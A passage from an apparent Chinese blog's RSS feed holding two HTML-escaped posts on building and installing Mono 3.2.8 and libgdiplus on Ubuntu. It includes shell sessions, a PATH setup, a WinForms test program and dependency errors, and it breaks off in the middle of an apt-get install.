&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/mono-3.2.8$ &lt;span class="nv">make&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;漫长的编译~&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/mono-3.2.8$ sudo make &lt;span class="nv">install&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>安装成功。&lt;/p>
&lt;p>##0×03设置PATH环境变量&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/mono-3.2.8$ &lt;span class="nb">cd&lt;/span> ~
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ vim .bashrc
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在该文件末尾追加以下语句：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">mono&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">3.2&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span> &lt;span class="p">];&lt;/span> &lt;span class="n">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">export&lt;/span> &lt;span class="n">PATH&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">mono&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">3.2&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">$&lt;/span>&lt;span class="n">PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">fi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ . .bashrc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ &lt;span class="nb">echo&lt;/span> &lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/opt/mono-3.2.8/bin:/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="004-验证mono是否安装正确">0×04 验证Mono是否安装正确
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ mono --version
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Mono JIT compiler version 3.2.8 &lt;span class="o">(&lt;/span>tarball 2014年 03月 27日 星期四 21:55:30 CST&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Copyright &lt;span class="o">(&lt;/span>C&lt;span class="o">)&lt;/span> 2002-2014 Novell, Inc, Xamarin Inc and Contributors. www.mono-project.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TLS: __thread
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SIGSEGV: altstack
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Notifications: epoll
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Architecture: x86
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disabled: none
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Misc: softdebug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LLVM: supported, not enabled.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GC: sgen
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ dmcs --version
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Mono C# compiler version 3.2.8.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>安装成功。&lt;/p></description></item><item><title>ubuntu安装mono环境(二)</title><link>https://www.keepwn.com/posts/ubuntu-installed-mono-environment-2/</link><pubDate>Fri, 28 Mar 2014 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/ubuntu-installed-mono-environment-2/</guid><description>&lt;p>接上篇，上篇仅安装了Mono本身，并没有安装libgdiplus、gtk-sharp、mod_mono、MonoDevelop 等其他相关的软件。&lt;/p>
&lt;p>这篇主要是配置安装libgdiplus。&lt;/p>
&lt;h2 id="000准备工作">0×00准备工作
&lt;/h2>&lt;p>先在VS2012上编译一个winform，代码如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-csharp" data-lang="csharp">&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">using&lt;/span> &lt;span class="nn">System.Windows.Forms&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">namespace&lt;/span> &lt;span class="nn">FormsTest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">static&lt;/span> &lt;span class="k">class&lt;/span> &lt;span class="nc">Program&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cs">/// &amp;lt;summary&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cs">/// 应用程序的主入口点。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cs">/// &amp;lt;/summary&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">[STAThread]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">static&lt;/span> &lt;span class="k">void&lt;/span> &lt;span class="n">Main&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Application&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">EnableVisualStyles&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Application&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SetCompatibleTextRenderingDefault&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Application&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="n">Form&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;!-- more -->
&lt;p>尝试在ubuntu上用mono运行：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ &lt;span class="nb">cd&lt;/span> Desktop/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/Desktop$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FormsTest.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/Desktop$ mono FormsTest.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Unhandled Exception:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">System.TypeInitializationException: An exception was thrown by the &lt;span class="nb">type&lt;/span> initializer &lt;span class="k">for&lt;/span> System.Windows.Forms.XplatUI ---&amp;gt; System.TypeInitializationException: An exception was thrown by the &lt;span class="nb">type&lt;/span> initializer &lt;span class="k">for&lt;/span> System.Drawing.GDIPlus ---&amp;gt; System.DllNotFoundException: /opt/mono-3.2.8/lib/libgdiplus.so
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at &lt;span class="o">(&lt;/span>wrapper managed-to-native&lt;span class="o">)&lt;/span> System.Drawing.GDIPlus:GdiplusStartup &lt;span class="o">(&lt;/span>ulong&lt;span class="p">&amp;amp;&lt;/span>,System.Drawing.GdiplusStartupInput&lt;span class="p">&amp;amp;&lt;/span>,System.Drawing.GdiplusStartupOutput&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Drawing.GDIPlus..cctor &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--- End of inner exception stack trace ---
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Drawing.Graphics.FromHdcInternal &lt;span class="o">(&lt;/span>IntPtr hdc&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.XplatUIX11.SetDisplay &lt;span class="o">(&lt;/span>IntPtr display_handle&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.XplatUIX11..ctor &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.XplatUIX11.GetInstance &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.XplatUI..cctor &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--- End of inner exception stack trace ---
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.Application.EnableVisualStyles &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at FormsTest.Program.Main &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>ERROR&lt;span class="o">]&lt;/span> FATAL UNHANDLED EXCEPTION: System.TypeInitializationException: An exception was thrown by the &lt;span class="nb">type&lt;/span> initializer &lt;span class="k">for&lt;/span> System.Windows.Forms.XplatUI ---&amp;gt; System.TypeInitializationException: An exception was thrown by the &lt;span class="nb">type&lt;/span> initializer &lt;span class="k">for&lt;/span> System.Drawing.GDIPlus ---&amp;gt; System.DllNotFoundException: /opt/mono-3.2.8/lib/libgdiplus.so
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at &lt;span class="o">(&lt;/span>wrapper managed-to-native&lt;span class="o">)&lt;/span> System.Drawing.GDIPlus:GdiplusStartup &lt;span class="o">(&lt;/span>ulong&lt;span class="p">&amp;amp;&lt;/span>,System.Drawing.GdiplusStartupInput&lt;span class="p">&amp;amp;&lt;/span>,System.Drawing.GdiplusStartupOutput&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Drawing.GDIPlus..cctor &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--- End of inner exception stack trace ---
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Drawing.Graphics.FromHdcInternal &lt;span class="o">(&lt;/span>IntPtr hdc&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.XplatUIX11.SetDisplay &lt;span class="o">(&lt;/span>IntPtr display_handle&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.XplatUIX11..ctor &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.XplatUIX11.GetInstance &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.XplatUI..cctor &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--- End of inner exception stack trace ---
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at System.Windows.Forms.Application.EnableVisualStyles &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">at FormsTest.Program.Main &lt;span class="o">()&lt;/span> &lt;span class="o">[&lt;/span>0x00000&lt;span class="o">]&lt;/span> in &amp;lt;filename unknown&amp;gt;:0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>遇到错误了System.DllNotFoundException: /opt/mono-3.2.8/lib/libgdiplus.so，原因是如果要在ubuntu运行winform，那么必须要安装libgdiplus。&lt;/p>
&lt;h2 id="001下载libgdiplus并编译">0×01下载libgdiplus并编译
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~$ &lt;span class="nb">cd&lt;/span> src
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src$ wget http://download.mono-project.com/sources/libgdiplus/libgdiplus-2.10.9.tar.bz2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--2014-03-27 22:46:40-- http://download.mono-project.com/sources/libgdiplus/libgdiplus-2.10.9.tar.bz2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Resolving download.mono-project.com &lt;span class="o">(&lt;/span>download.mono-project.com&lt;span class="o">)&lt;/span>... 54.230.157.116, 54.230.157.204, 54.230.158.216, ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connecting to download.mono-project.com &lt;span class="o">(&lt;/span>download.mono-project.com&lt;span class="o">)&lt;/span>&lt;span class="p">|&lt;/span>54.230.157.116&lt;span class="p">|&lt;/span>:80... connected.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTTP request sent, awaiting response... &lt;span class="m">200&lt;/span> OK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Length: &lt;span class="m">2074317&lt;/span> &lt;span class="o">(&lt;/span>2.0M&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>application/x-bzip2&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Saving to: ‘libgdiplus-2.10.9.tar.bz2’
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">100%&lt;span class="o">[======================================&lt;/span>&amp;gt;&lt;span class="o">]&lt;/span> 2,074,317 224KB/s in 9.5s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2014-03-27 22:46:54 &lt;span class="o">(&lt;/span>&lt;span class="m">213&lt;/span> KB/s&lt;span class="o">)&lt;/span> - ‘libgdiplus-2.10.9.tar.bz2’ saved &lt;span class="o">[&lt;/span>2074317/2074317&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src$ ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libgdiplus-2.10.9.tar.bz2 mono-3.2.8 mono-3.2.8.tar.bz2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src$ tar -xvjf libgdiplus-2.10.9.tar.bz2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src$ &lt;span class="nb">cd&lt;/span> libgdiplus-2.10.9/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ ./configure --prefix&lt;span class="o">=&lt;/span>/opt/mono-3.2.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==============&lt;/span>&amp;gt;省略了很多&amp;lt;&lt;span class="o">==============&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking pkg-config is at least version 0.9.0... yes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checking &lt;span class="k">for&lt;/span> BASE_DEPENDENCIES... no
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">configure: error: Package requirements &lt;span class="o">(&lt;/span>glib-2.0 &lt;span class="p">&amp;amp;&lt;/span>gt&lt;span class="p">;&lt;/span>&lt;span class="o">=&lt;/span> 2.2.3&lt;span class="o">)&lt;/span> were not met:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No package &lt;span class="s1">&amp;#39;glib-2.0&amp;#39;&lt;/span> found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Consider adjusting the PKG_CONFIG_PATH environment variable &lt;span class="k">if&lt;/span> you
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">installed software in a non-standard prefix.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Alternatively, you may &lt;span class="nb">set&lt;/span> the environment variables BASE_DEPENDENCIES_CFLAGS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">and BASE_DEPENDENCIES_LIBS to avoid the need to call pkg-config.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">See the pkg-config man page &lt;span class="k">for&lt;/span> more details.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>遇到错误了，需要安装libglib2.0-dev：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">nike@NIKE-PC:~/src/libgdiplus-2.10.9$ sudo apt-get install libglib2.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Reading package lists... Done
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Building dependency tree
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Reading state information... Done
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The following extra packages will be installed:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libglib2.0-0 libglib2.0-bin libpcre3-dev libpcrecpp0 zlib1g-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Suggested packages:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libglib2.0-doc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The following NEW packages will be installed:
